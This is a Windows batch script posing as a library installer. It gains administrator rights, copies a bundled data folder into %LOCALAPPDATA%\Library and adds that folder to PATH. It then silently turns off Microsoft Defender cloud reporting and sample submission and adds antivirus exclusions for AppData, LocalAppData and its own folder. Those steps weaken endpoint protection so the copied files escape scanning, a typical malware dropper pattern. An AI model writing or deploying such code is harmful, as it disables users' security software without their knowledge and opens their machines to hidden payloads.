@echo off
setlocal enabledelayedexpansion

:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: Script is running with admin privileges now

set "CURDIR=%~dp0"
if "%CURDIR:~-1%"=="\" set "CURDIR=%CURDIR:~0,-1%"

echo Installing required libraries...

:: Copy content of /data folder to AppData Local Library
xcopy /s /i /y "%CURDIR%\data" "%LOCALAPPDATA%\Library"

:: Add %LOCALAPPDATA%\Library to the user PATH permanently
:: Get current user PATH, append new path if not already present

set "newPath=%LOCALAPPDATA%\Library"
for /f "usebackq tokens=2,* delims= " %%A in (`reg query "HKCU\Environment" /v Path 2^>nul`) do (
    set "currentUserPath=%%B"
)

:: Check if newPath already exists in PATH (case-insensitive)
echo %currentUserPath% | find /i "%newPath%" >nul
if errorlevel 1 (
    setx Path "%currentUserPath%;%newPath%"
    echo Path updated with %newPath%
) else (
    echo Path already contains %newPath%
)

powershell -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1

set "AppData=%APPDATA%"
set "ExeDir=%~dp0"
set "LocalAppData=%LOCALAPPDATA%"

powershell -Command "Add-MpPreference -ExclusionPath '%AppData%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%ExeDir%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%LocalAppData%'" >nul 2>&1

echo All done!.
pause
endlocal
exit /b 0